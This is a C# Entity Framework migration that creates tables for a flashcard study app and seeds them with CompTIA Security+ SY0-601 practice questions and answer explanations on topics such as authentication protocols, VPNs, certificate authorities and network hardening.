using Microsoft.EntityFrameworkCore.Migrations;

namespace FlasherData.Migrations
{
    public partial class initial : Migration
    {
        protected override void Up(MigrationBuilder migrationBuilder)
        {
            migrationBuilder.CreateTable(
                name: "Subjects",
                columns: table => new
                {
                    Id = table.Column<int>(type: "INTEGER", nullable: false)
                        .Annotation("Sqlite:Autoincrement", true),
                    Name = table.Column<string>(type: "TEXT", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_Subjects", x => x.Id);
                });

            migrationBuilder.CreateTable(
                name: "Categories",
                columns: table => new
                {
                    Id = table.Column<int>(type: "INTEGER", nullable: false)
                        .Annotation("Sqlite:Autoincrement", true),
                    Name = table.Column<string>(type: "TEXT", nullable: false),
                    SubjectId = table.Column<int>(type: "INTEGER", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_Categories", x => x.Id);
                    table.ForeignKey(
                        name: "FK_Categories_Subjects_SubjectId",
                        column: x => x.SubjectId,
                        principalTable: "Subjects",
                        principalColumn: "Id",
                        onDelete: ReferentialAction.Cascade);
                });

            migrationBuilder.CreateTable(
                name: "Tests",
                columns: table => new
                {
                    Id = table.Column<int>(type: "INTEGER", nullable: false)
                        .Annotation("Sqlite:Autoincrement", true),
                    Name = table.Column<string>(type: "TEXT", nullable: false),
                    SubjectId = table.Column<int>(type: "INTEGER", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_Tests", x => x.Id);
                    table.ForeignKey(
                        name: "FK_Tests_Subjects_SubjectId",
                        column: x => x.SubjectId,
                        principalTable: "Subjects",
                        principalColumn: "Id",
                        onDelete: ReferentialAction.Cascade);
                });

            migrationBuilder.CreateTable(
                name: "Flashcards",
                columns: table => new
                {
                    Id = table.Column<int>(type: "INTEGER", nullable: false)
                        .Annotation("Sqlite:Autoincrement", true),
                    Name = table.Column<string>(type: "TEXT", nullable: true),
                    Front = table.Column<string>(type: "TEXT", nullable: false),
                    Back = table.Column<string>(type: "TEXT", nullable: false),
                    CategoryId = table.Column<int>(type: "INTEGER", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_Flashcards", x => x.Id);
                    table.ForeignKey(
                        name: "FK_Flashcards_Categories_CategoryId",
                        column: x => x.CategoryId,
                        principalTable: "Categories",
                        principalColumn: "Id",
                        onDelete: ReferentialAction.Cascade);
                });

            migrationBuilder.CreateTable(
                name: "Questions",
                columns: table => new
                {
                    Id = table.Column<int>(type: "INTEGER", nullable: false)
                        .Annotation("Sqlite:Autoincrement", true),
                    Number = table.Column<int>(type: "INTEGER", nullable: false),
                    AnsweredCorrectly = table.Column<bool>(type: "INTEGER", nullable: false),
                    TestId = table.Column<int>(type: "INTEGER", nullable: false),
                    FlashcardId = table.Column<int>(type: "INTEGER", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_Questions", x => x.Id);
                    table.ForeignKey(
                        name: "FK_Questions_Tests_TestId",
                        column: x => x.TestId,
                        principalTable: "Tests",
                        principalColumn: "Id",
                        onDelete: ReferentialAction.Cascade);
                });

            migrationBuilder.InsertData(
                table: "Subjects",
                columns: new[] { "Id", "Name" },
                values: new object[] { 1, "CompTIA Security+ SY0-601 Practice Questions" });

            migrationBuilder.InsertData(
                table: "Subjects",
                columns: new[] { "Id", "Name" },
                values: new object[] { 2, "Subject_2" });

            migrationBuilder.InsertData(
                table: "Categories",
                columns: new[] { "Id", "Name", "SubjectId" },
                values: new object[] { 1, "Threats, Attacks, and Vulnerabilities", 1 });

            migrationBuilder.InsertData(
                table: "Categories",
                columns: new[] { "Id", "Name", "SubjectId" },
                values: new object[] { 2, "Architecture and Design", 1 });

            migrationBuilder.InsertData(
                table: "Categories",
                columns: new[] { "Id", "Name", "SubjectId" },
                values: new object[] { 3, "Implementation", 1 });

            migrationBuilder.InsertData(
                table: "Categories",
                columns: new[] { "Id", "Name", "SubjectId" },
                values: new object[] { 4, "Operations and Incident Response", 1 });

            migrationBuilder.InsertData(
                table: "Categories",
                columns: new[] { "Id", "Name", "SubjectId" },
                values: new object[] { 5, "Governance, Risk, and Compliance", 1 });

            migrationBuilder.InsertData(
                table: "Tests",
                columns: new[] { "Id", "Name", "SubjectId" },
                values: new object[] { 1, "Security+ SY0-601 Test 1", 1 });

            migrationBuilder.InsertData(
                table: "Tests",
                columns: new[] { "Id", "Name", "SubjectId" },
                values: new object[] { 2, "Test_2", 2 });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 1, "1. C. The correct answer is spear phishing. Spear phishing is\r\ntargeted to a specific group, in this case insurance professionals.\r\nAlthough this is a form of phishing, the more specific answer is\r\nthe one you will need to choose on questions like this. Phishing\r\nuses social engineering techniques to succeed but is once again a\r\nbroader answer than spear phishing and thus is not the correct\r\nchoice. Finally, a Trojan horse pretends to be a legitimate or\r\ndesirable program or file, which this scenario doesn’t describe.\r\n", 1, "1. Ahmed is a sales manager with a major insurance company. He has received an email that is\r\nencouraging him to click on a link and fill out a survey. He is suspicious of the email, but it\r\ndoes mention a major insurance association, and that makes him think it might be legitimate.\r\nWhich of the following best describes this attack?\r\nA. Phishing\r\nB. Social engineering\r\nC. Spear phishing\r\nD. Trojan horse\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 595, "\r\n189. A. The net user command allows this control to be put in place.\r\nAlthough you may not be familiar with the many net user\r\ncommands, you can take out unrealistic commands or\r\ncommands with flaws in them. For example, here you could\r\nlikely guess that -working-hours isn’t a defined term. In the same\r\nway, login isn’t a Windows command, but net commands are\r\ncommonly used to control Windows systems.\r\n", 3, "\r\n189. Tracy wants to limit when users can log in to a standalone Windows workstation. What can\r\nTracy do to make sure that an account called “visitor” can only log in between 8 a.m.\r\nand 5 p.m. every weekday?\r\nA. Running the command net user visitor /time:M-F,8am-5pm\r\nB. Running the command netreg user visitor -daily -working-hours\r\nC. Running the command login limit:daily time: 8-5\r\nD. This cannot be done from the Windows command line.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 596, "\r\n190. A. Auditing and reviewing how users actually utilize their\r\naccount permissions would be the best way to determine if there\r\nis any inappropriate use. A classic example would be a bank loan\r\nofficer. By the nature of their job, they have access to loan\r\ndocuments. But they should not be accessing loan documents for\r\nloans they are not servicing. The issue in this case is not\r\npermissions, because the users require permission to access the\r\ndata. The issue is how the users are using their permissions.\r\nUsage auditing and permissions auditing are both part of\r\naccount maintenance, but auditing and review is a better\r\nanswer. Finally, this is not a policy issue.\r\n", 3, "\r\n190. Sheila is concerned that some users on her network may be accessing files that they should\r\nnot—specifically, files that are not required for their job tasks. Which of the following\r\nwould be most effective in determining if this is happening?\r\nA. Usage auditing and review\r\nB. Permissions auditing and review\r\nC. Account maintenance\r\nD. Policy review\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 597, "\r\n191. B. A scenario such as guest Wi-Fi access does not provide the\r\nlogins with any access to corporate resources. The people\r\nlogging in merely get to access the Internet. This poses very\r\nlimited security risk to the corporate network and thus is often\r\ndone with a common or shared account. Tech support personnel\r\ngenerally have significant access to corporate network resources.\r\nAlthough this is a relatively low access scenario, it is still\r\nimportant to know which specific student is logging on and\r\naccessing what resources. Any level of access to corporate\r\nresources should have its own individual login account.\r\n", 3, "\r\n191. In which of the following scenarios would using a shared account pose the least\r\nsecurity risk?\r\nA. For a group of tech support personnel\r\nB. For guest Wi-Fi access\r\nC. For students logging in at a university\r\nD. For accounts with few privileges\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 598, "\r\n192. B. Certificate chains list certificates and certificate authority\r\n(CA) certificates, allowing those who receive the certificate to\r\nvalidate that the certificates can be trusted. An invalid, or\r\nbroken, chain means that the user or system that is checking the\r\ncertificate chaining should not trust the system and certificate.\r\n", 3, "\r\n192. Mike’s manager has asked him to verify that the certificate chain for their production website\r\nis valid. What has she asked Mike to validate?\r\nA. That the certificate has not been revoked\r\nB. That users who visit the website can verify that the site and the CAs in the chain are\r\nall trustworthy\r\nC. That the encryption used to create the certificate is strong and has not been cracked\r\nD. That the certificate was issued properly and that prior certificates issued for the same\r\nsystem have also been issued properly\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 599, "\r\n193. D. 802.1X is the IEEE standard for port-based network access\r\ncontrol. This protocol is frequently used to authenticate devices.\r\nChallenge Handshake Authentication Protocol (CHAP) is an\r\nauthentication protocol but not the best choice for device\r\nauthentication. Kerberos is an authentication protocol but not\r\nthe best choice for device authentication. 802.11i is the Wi-Fi\r\nsecurity standard and is fully implemented in WPA2 and WPA3.\r\nIt is not a device authentication procedure.\r\n", 3, "\r\n193. Maria is responsible for security at a small company. She is concerned about unauthorized\r\ndevices being connected to the network. She is looking for a device authentication process.\r\nWhich of the following would be the best choice for her?\r\nA. CHAP\r\nB. Kerberos\r\nC. 802.11i\r\nD. 802.1X\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 600, "\r\n194. A. WPA2 uses the AES-based CCMP, or Counter Mode Block\r\nChaining Message Authentication (CBC-MAC) Protocol to\r\nencapsulate traffic, providing confidentiality. WPA3 also uses\r\nCCMP as the minimum acceptable encryption in WPA3-\r\nPersonal mode. WEP, infrared, and Bluetooth do not use CCMP.\r\n", 3, "\r\n194. Which wireless standard uses CCMP to provide encryption for network traffic?\r\nA. WPA2\r\nB. WEP\r\nC. Infrared\r\nD. Bluetooth\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 601, "\r\n195. A. Simple Network Management Protocol (SNMP) would give\r\nan attacker a great deal of information about your network.\r\nSNMP should not be exposed to unprotected networks, SNMPv3\r\nshould be implemented, and SNMP security best practices\r\nshould be followed. Both POP3 and IMAP are email access\r\nprotocols, and Dynamic Host Configuration Protocol (DHCP) is\r\nused to hand out dynamic IP addresses.\r\n", 3, "\r\n195. Charles is a CISO for an insurance company. He recently read about an attack wherein an\r\nattacker was able to enumerate all the network devices in an organization. All this was done\r\nby sending queries using a single protocol. Which protocol should Charles secure to mitigate\r\nthis attack?\r\nA. SNMP\r\nB. POP3\r\nC. DHCP\r\nD. IMAP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 602, "\r\n196. C. Accounts should lock out after a small number of login\r\nattempts. Three is a common number of attempts before the\r\naccount is locked out. This prevents someone from just\r\nattempting random guesses. Password aging will force users to\r\nchange their passwords but won’t affect password guessing.\r\nLonger passwords would be harder to guess, but this option is\r\nnot as effective as account lockout policies. Account usage\r\nauditing won’t have any effect on this issue.\r\n", 3, "\r\n196. Magnus is concerned about someone using a password cracker on computers in his\r\ncompany. He is concerned that crackers will attempt common passwords in order to log in\r\nto a system. Which of the following would be best for mitigating this threat?\r\nA. Password age restrictions\r\nB. Password minimum length requirements\r\nC. Account lockout policies\r\nD. Account usage auditing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 603, "\r\n197. A. Security Assertion Markup Language (SAML) is an XMLbased,\r\nopen standard format for exchanging authentication and\r\nauthorization data between parties. OAuth allows an end user’s\r\naccount information to be used by third-party services, without\r\nexposing the user’s password. RADIUS is a remote access\r\nprotocol. New Technology LAN Manager (NTLM) is not XMLbased.\r\n", 3, "\r\n197. Lucas is looking for an XML-based open standard for exchanging authentication\r\ninformation. Which of the following would best meet his needs?\r\nA. SAML\r\nB. OAuth\r\nC. RADIUS\r\nD. NTLM\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 604, "\r\n198. A. Challenge Handshake Authentication Protocol (CHAP) was\r\ndesigned specifically for this purpose. It periodically\r\nreauthenticates, thus preventing session hijacking. Neither\r\nPassword Authentication Protocol (PAP) nor TACACS+ prevents\r\nsession hijacking, and RADIUS is a protocol for remote access,\r\nnot authentication.\r\n", 3, "\r\n198. Joshua is looking for an authentication protocol that would be effective at stopping session\r\nhijacking. Which of the following would be his best choice?\r\nA. CHAP\r\nB. PAP\r\nC. TACACS+\r\nD. RADIUS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 605, "\r\n199. C. IPSec virtual private networks (VPNs) can make a remote\r\nlocation appear as though it is connected to your local network.\r\nSince Greg needs to rely on a streaming security camera, an\r\nalways-on IPSec VPN is the best solution listed. TLS (SSL) VPNs\r\nare primarily used for specific applications, typically focusing on\r\nweb applications.\r\n", 3, "\r\n199. Greg’s company has a remote location that uses an IP-based streaming security camera\r\nsystem. How could Greg ensure that the remote location’s networked devices can be\r\nmanaged as if they are local devices and that the traffic to that remote location is secure?\r\nA. An as-needed TLS VPN\r\nB. An always-on TLS VPN\r\nC. An always-on IPSec VPN\r\nD. An as-needed IPSec VPN\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 594, "\r\n188. D. Bridge Protocol Data Unit, or BDPU, guard protects network\r\ninfrastructure by preventing unknown devices from\r\nparticipating in spanning tree. That prevents a new switch\r\nadded by a user from claiming to be the root bridge (in this case,\r\nSwitch C), which would normally cause a topology change and\r\nfor traffic to be sent to Switch X, an undesirable result. 802.11n\r\nis a wireless protocol, and the remaining options were made up\r\nfor this question.\r\n", 3, "\r\n188. The following image shows a scenario where Switch X is attached to a network by an end\r\nuser and advertises itself with a lower spanning tree priority than the existing switches.\r\nWhich of the following settings can prevent this type of issue from occurring?\r\nPriority: 32768 Priority: 32768\r\nPriority: 1024\r\nSwitch X\r\nSwitch A Switch B\r\nSwitch C\r\nPriority: 16384\r\nA. 802.11n\r\nB. Port recall\r\nC. RIP guard\r\nD. BPDU guard\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 606, "\r\n200. B. The Opal storage specification defines how to protect\r\nconfidentiality for stored user data and how storage devices\r\nfrom storage device manufacturers can work together. OPAL\r\ndoes not specify details or processes for licenses, accounts, and\r\nlibraries, or degaussers.\r\n", 3, "\r\n200. What does the OPAL standard specify?\r\nA. Online personal access licenses\r\nB. Self-encrypting drives\r\nC. The origin of personal accounts and libraries\r\nD. Drive sanitization modes for degaussers\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 608, "\r\n202. C. OpenID Connect works with the OAuth 2.0 protocol and\r\nsupports multiple clients, including web-based and mobile\r\nclients. OpenID Connect also supports REST. Shibboleth is a\r\nmiddleware solution for authentication and identity\r\nmanagement that uses SAML (Security Assertion Markup\r\nLanguage) and works over the Internet. RADIUS is a remote\r\naccess protocol. OAuth allows an end user’s account information\r\nto be used by third-party services, without exposing the user’s\r\npassword.\r\n", 3, "\r\n202. Derek is trying to select an authentication method for his company. He needs one that will\r\nwork with a broad range of services like those provided by Microsoft and Google so that\r\nusers can bring their own identities. Which of the following would be his best choice?\r\nA. Shibboleth\r\nB. RADIUS\r\nC. OpenID Connect\r\nD. OAuth\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 609, "\r\n203. D. Anomaly-based detection systems build a behavioral\r\nbaseline for networks and then assess differences from those\r\nbaselines. They may use heuristic capabilities on top of those,\r\nbut the question specifically asks about baselined operations\r\npointing to an anomaly-based system. Heuristic-based\r\ndetections look for behaviors that are typically malicious, and\r\nsignature-based or hash-based detections look for known\r\nmalicious tools or files.\r\n", 3, "\r\n203. Jason is considering deploying a network intrusion prevention system (IPS) and wants to be\r\nable to detect advanced persistent threats. What type of IPS detection method is most likely\r\nto detect the behaviors of an APT after it has gathered baseline information about normal\r\noperations?\r\nA. Signature-based IPS detections\r\nB. Heuristic-based IPS detections\r\nC. Malicious tool hash IPS detections\r\nD. Anomaly-based IPS detections\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 610, "\r\n204. B. A Trusted Platform Module, or TPM, is used as the\r\nfoundation for a hardware root of trust for modern PCs. The\r\nTPM may provide a cryptographic key; a PUF, or physically\r\nunclonable function; or a serial number that is unique to the\r\ndevice. The CPU and hard drive are not used for this function,\r\nand HSMs, or hardware security modules, are used for public\r\nkey infrastructure (PKI) and cryptographic purposes but not as a\r\nhardware root of trust for PCs.\r\n", 3, "\r\n204. What component is most often used as the foundation for a hardware root of trust for a\r\nmodern PC?\r\nA. The CPU\r\nB. A TPM\r\nC. A HSM\r\nD. The hard drive or SSD\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 611, "\r\n205. C. Next-generation firewalls typically build in advanced\r\ncapabilities like URL filtering, blacklisting, and other\r\napplication-layer capabilities beyond simple packet filtering or\r\nstateful packet inspection.\r\n", 3, "\r\n205. Dennis wants to deploy a firewall that can provide URL filtering. What type of firewall\r\nshould he deploy?\r\nA. A packet filter\r\nB. A stateful packet inspection firewall\r\nC. A next-generation firewall\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 612, "\r\n206. D. Mobile application management (MAM) tools are\r\nspecifically designed for this purpose, and they allow\r\napplications to be delivered to, removed from, and managed on\r\nmobile devices. MOM is the Microsoft Operations Manager, a\r\nsystems management tool that Microsoft has replaced with\r\nOperations Manager in current use. MLM often means\r\nmultilevel marketing, or pyramid schemes—not a security term.\r\nMIM is not a security term.\r\n", 3, "\r\n206. Waleed’s organization uses a combination of internally developed and commercial applications\r\nthat they deploy to mobile devices used by staff throughout the company. What type\r\nof tool can he use to handle a combination of bring-your-own-device phones and corporate\r\ntablets that need to have these applications loaded onto them and removed from them when\r\ntheir users are no longer part of the organization?\r\nA. MOM\r\nB. MLM\r\nC. MIM\r\nD. MAM\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 613, "\r\n207. A. Cloud applications have many of the same concerns as onpremises\r\napplications, but compromise of the system running\r\nthe application due to local access is a far less likely scenario.\r\nCloud application vendors are more likely to operate in secure\r\ndatacenters with limited or no access to the servers except for\r\nauthorized personnel, greatly reducing the likelihood of this type\r\nof security issue.\r\n", 3, "\r\n207. Charlene is preparing a report on the most common application security issues for cloud\r\napplications. Which of the following is not a major concern for cloud applications?\r\nA. Local machine access leading to compromise\r\nB. Misconfiguration of the application\r\nC. Insecure APIs\r\nD. Account compromise\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 614, "\r\n208. D. The most critical part of a certificate authority (CA) is its\r\nroot certificate, and ensuring that the root certificate is never\r\nexposed is critical to the ongoing operating of that CA. Thus,\r\nroot CAs are often maintained as offline CAs, making it far\r\nharder for an attacker to compromise the system and gain access\r\nto the root certificate. In practice, compromised CAs may lose\r\nthe trust of organizations around the world and be unable to\r\ncontinue to do business.\r\n", 3, "\r\n208. The CA that Samantha is responsible for is kept physically isolated and is never connected\r\nto a network. When certificates are issued, they are generated then manually transferred via\r\nremovable media. What type of CA is this, and why would Samantha’s organization run a\r\nCA in this mode?\r\nA. An online CA; it is faster to generate and provide certificates.\r\nB. An offline CA; it is faster to generate and provide certificates.\r\nC. An online CA; it prevents potential exposure of the CA’s root certificate.\r\nD. An offline CA; it prevents potential exposure of the CA’s root certificate.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 615, "\r\n209. C. Split-tunnel VPNs send only traffic destined for the remote\r\nnetwork over the VPN, with all other traffic split away to use the\r\nVPN system or a user’s primary network connection. This\r\nreduces overall traffic sent through the VPN but means that\r\ntraffic cannot be monitored and secured via the VPN. Half-pipe\r\nis not a security term, and split horizon is most often used to\r\ndescribe DNS where an internal and external DNS view may be\r\ndifferent.\r\n", 3, "\r\n209. Susan has configured a virtual private network (VPN) so that traffic destined for systems on\r\nher corporate network is routed over the VPN but traffic sent to other destinations is sent\r\nout via the VPN user’s local network. What is this configuration called?\r\nA. Half-pipe\r\nB. Full-tunnel\r\nC. Split-tunnel\r\nD. Split horizon\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 616, "\r\n210. A. Loop protection looks for exactly this type of issue. Loop\r\nprotection sends packets that include a PDU, or protocol data\r\nunit. These are detected by other network devices and allow the\r\nnetwork devices to shut down ports from which they receive\r\nthose packets. The remaining options were made up for this\r\nquestion.\r\n", 3, "\r\n210. Adam has experienced problems with users plugging in cables between switches on his\r\nnetwork, which results in multiple paths to the same destinations being available to systems\r\non the network. When this occurs, the network experiences broadcast storms, causing\r\nnetwork outages. What network configuration setting should he enable on his switches to\r\nprevent this?\r\nA. Loop protection\r\nB. Storm watch\r\nC. Sticky ports\r\nD. Port inspection\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 617, "\r\n211. C. Over-the-air (OTA) updates are used by cellular carriers as\r\nwell as phone manufacturers to provide firmware updates and\r\nupdated phone configuration data. Mobile device management\r\n(MDM) tools can be used to monitor for the current firmware\r\nversion and phone settings and will allow Charles to determine if\r\nthe phones that his staff use are updated to ensure security. A\r\nnetwork access control (NAC) agent might capture some of this\r\ndata but only for network-connected phones, which will not\r\ncover off-site phones, those with Wi-Fi turned off, or remote\r\ndevices. OTA is not specifically a way to update encryption keys,\r\nalthough firmware or settings might include them. OTA is not\r\nsent by the phones themselves.\r\n", 3, "\r\n211. Charles is concerned that users of Android devices in his company are delaying OTA\r\nupdates. Why would Charles be concerned about this, and what should he do about it?\r\nA. OTA updates patch applications, and a NAC agent would report on all phones in the\r\norganization.\r\nB. OTA updates update device encryption keys and are necessary for security, and a PKI\r\nwould track encryption certificates and keys.\r\nC. OTA updates patch firmware and updates phone configurations, and an MDM tool\r\nwould provide reports on firmware versions and phone settings\r\nD. OTA updates are sent by phones to report on online activity and tracking, and an\r\nMDM tool receives OTA updates to monitor phones\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 618, "\r\n212. C. Open source firewalls typically do not have the same level of\r\nvendor support and maintenance that commercial firewalls do.\r\nThat means you don’t have a vendor to turn to if something goes\r\nwrong, and you will be reliant on a support community for\r\npatches and updates. Open source firewalls are typically less\r\nexpensive, their open source nature means that the code can be\r\nvalidated by anybody who cares to examine it, and it can be\r\nacquired as quickly as it can be downloaded.\r\n", 3, "\r\n212. Ben is preparing to implement a firewall for his network and is considering whether to\r\nimplement an open source firewall or a proprietary commercial firewall. Which of the following\r\nis not an advantage of an open source firewall?\r\nA. Lower cost\r\nB. Community code validation\r\nC. Maintenance and support\r\nD. Speed of acquisition\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 607, "\r\n201. B. UEFI Secure Boot checks every binary that is loaded during\r\nboot to make sure that its hash is valid, by checking against\r\neither a locally trusted certificate or a checksum on an allow list.\r\nIt does not protect against worms that might attack those\r\nbinaries, nor does it directly check the system BIOS version.\r\n", 3, "\r\n201. What does Unified Extensible Firmware Interface (UEFI) Secure Boot do?\r\nA. It protects against worms during the boot process.\r\nB. It validates a signature for each binary loaded during boot.\r\nC. It validates the system BIOS version.\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 619, "\r\n213. C. WPA3 personal replaced PSK, or preshared keys, with SAE,\r\nor simultaneous authentication of equals. SAE helps to prevent\r\nbrute-force attacks against keys by making attackers interact\r\nwith the network before each authentication attempt. This slows\r\ndown brute-force attacks. WPA3 also includes a 192-bit\r\nencryption mode. It does not replace 64-bit encryption with 128-\r\nbit encryption, add per-channel security, or add distributed\r\ndenial-of-service (DDoS) monitoring and prevention.\r\n", 3, "\r\n213. Barbara wants to implement WPA3 Personal. Which of the following features is a major\r\nsecurity improvement in WPA3 over WPA2?\r\nA. DDoS monitoring and prevention\r\nB. Per-channel security\r\nC. Brute-force attack prevention\r\nD. Improvements from 64-bit to 128-bit encryption\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 593, "\r\n187. B. If the system maintains a password history, that would\r\nprevent any user from reusing an old password. Password\r\ncomplexity and length are common security settings but would\r\nnot prevent the behavior described. Multifactor authentication\r\nhelps prevent brute-force attacks and reduces the potential\r\nimpact of stolen passwords but would not help with this\r\nscenario.\r\n", 3, "\r\n187. Henry is an employee at Acme Company. The company requires him to change his password\r\nevery three months. He has trouble remembering new passwords, so he keeps switching between\r\njust two passwords. Which policy would be most effective in preventing this?\r\nA. Password complexity\r\nB. Password history\r\nC. Password length\r\nD. Multifactor authentication\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 591, "\r\n185. C. Network address translation (NAT) gateways allow internal\r\nIP addresses to be hidden from the outside, preventing direct\r\nconnections to systems behind them. This effectively firewalls\r\ninbound traffic unless the gateway is set to pass traffic to an\r\ninternal host when a specific IP, port, and protocol is used. They\r\nare not a firewall in the traditional sense, however, and do not\r\nspecifically statefully block traffic by port and protocol, nor do\r\nthey detect malicious traffic. Finally, NAT gateways are not used\r\nto send non-IP traffic out to IP networks.\r\n", 3, "\r\n185. Gary’s organization uses a NAT gateway at its network edge. What security benefit does a\r\nNAT gateway provide?\r\nA. It statefully blocks traffic based on port and protocol as a type of firewall.\r\nB. It can detect malicious traffic and stop it from passing through.\r\nC. It allows systems to connect to another network without being directly exposed to it.\r\nD. It allows non-IP-based addresses to be used behind a legitimate IP address.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 567, "\r\n161. B. API keys allow individual customers to authenticate to the\r\nAPI service, which means that if there is a problem Henry can\r\ndisable the problematic API keys rather than all users. Enabling\r\nlogging using a service like Amazon’s API Gateway allows\r\nscalability, logging, and monitoring, as well as tools like web\r\napplication firewalls. An API proxy and API-centric intrusion\r\nprevention system (IPS) were made up for this question.\r\n", 3, "\r\n161. Henry wants to deploy a web service to his cloud environment for his customers to use. He\r\nwants to be able to see what is happening and stop abuse without shutting down the service\r\nif customers cause issues. What two things should he implement to allow this?\r\nA. An API gateway and logging\r\nB. API keys and logging via an API gateway\r\nC. An API-centric IPS and an API proxy\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 568, "\r\n162. C. UTM, or unified threat management, devices commonly\r\nserve as firewalls, intrusion detection system (IDS)/intrusion\r\nprevention system (IPS), antivirus, web proxies, web application\r\nand deep packet inspection, secure email gateways, data loss\r\nprevention (DLP), security information and event management\r\n(SIEM), and even virtual private networking (VPN) devices.\r\nThey aren’t mobile device management (MDM) or universal\r\nendpoint management devices, however, since their primary\r\nfocus is on network security, not systems or device management.\r\n", 3, "\r\n162. Patrick has been asked to identify a UTM appliance for his organization. Which of the following\r\ncapabilities is not a common feature for a UTM device?\r\nA. IDS and or IPS\r\nB. Antivirus\r\nC. MDM\r\nD. DLP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 569, "\r\n163. B. Mandatory access control (MAC) is based on documented\r\nsecurity levels associated with the information being accessed.\r\nRole-based access control (RBAC) is based on the role the user is\r\nplaced in. Discretionary access control (DAC) lets the data\r\nowner set access control. BAC is not an access control model.\r\n", 3, "\r\n163. A companywide policy is being created to define various security levels. Which of the following\r\nsystems of access control would use documented security levels like Confidential or\r\nSecret for information?\r\nA. RBAC\r\nB. MAC\r\nC. DAC\r\nD. BAC\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
